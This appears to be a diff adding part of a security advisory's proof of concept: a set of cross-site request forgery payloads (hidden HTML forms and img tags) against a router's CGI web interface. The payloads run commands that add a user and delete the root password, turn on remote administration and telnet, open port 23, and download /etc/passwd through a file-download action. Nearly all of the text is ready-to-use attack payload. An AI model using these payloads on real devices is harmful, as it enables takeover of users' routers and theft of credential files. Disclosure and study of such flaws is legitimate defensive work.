@@ -1,0 +1,93 @@
+<form method="post" action="http://www.example.com/cgi-bin/webmain.cgi"
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_cmd_result">
+<input type="hidden" name="cmd" value="adduser -S jaku">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/webmain.cgi?act=act_cmd_result&cmd=adduser%
+20-S%20jaku'>
+
+Remove root password:
+<form method="post" action="http://www.example.com/cgi-bin/webmain.cgi"
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_cmd_result">
+<input type="hidden" name="cmd" value="passwd -d root">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/webmain.cgi?act=act_cmd_result&cmd=passwd%2
+0-d%20root'>
+
+Enable remote administration access:
+<form method="post" action="http://www.example.com/cgi-bin/webmain.cgi"
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_network_set">
+<input type="hidden" name="enable_remote_access" value="YES">
+<input type="hidden" name="remote_access_port" value="80">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/webmain.cgi?act=act_network_set&enable_remo
+te_access=YES&remote_access_port=80'>
+
+Enable telnet if not already enabled:
+
+<form method="post" action="http://www.example.com/cgi-bin/webmain.cgi"
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_set_wimax_etc_config">
+<input type="hidden" name="ENABLE_TELNET" value="YES">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/webmain.cgi?act=act_set_wimax_etc_config&EN
+ABLE_TELNET=YES'>
+
+Allow remote telnet access:
+<form method="post" action="http://www.example.com/cgi-bin/webmain.cgi"
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_network_set">
+<input type="hidden" name="add_enable" value="YES">
+<input type="hidden" name="add_host_ip" value="1">
+<input type="hidden" name="add_port" value="23">
+<input type="hidden" name="add_protocol" value="BOTH">
+<input type="hidden" name="add_memo" value="admintelnet">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/webmain.cgi?act=act_network_set&add_enable=
+YES&add_host_ip=1&add_port=23&add_protocol=both&add_memo=admintelnet'>
+
+Once compromised, it is possible to download any file from the devices
+using
+the following method.
+
+Download /etc/passwd file:
+<form method="post" action="http://www.example.com/cgi-bin/upgrademain.cgi
+<http://192.168.1.1/cgi-bin/upgrademain.cgi> ">
+<input type="hidden" name="act" value="act_file_download">
+<input type="hidden" name="METHOD" value="PATH">
+<input type="hidden" name="FILE_PATH" value="/etc/passwd">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://www.example.com/cgi-bin/upgrademain.cgi?act=act_file_download&METHO
+D=PATH&FILE_PATH=/etc/passwd'>
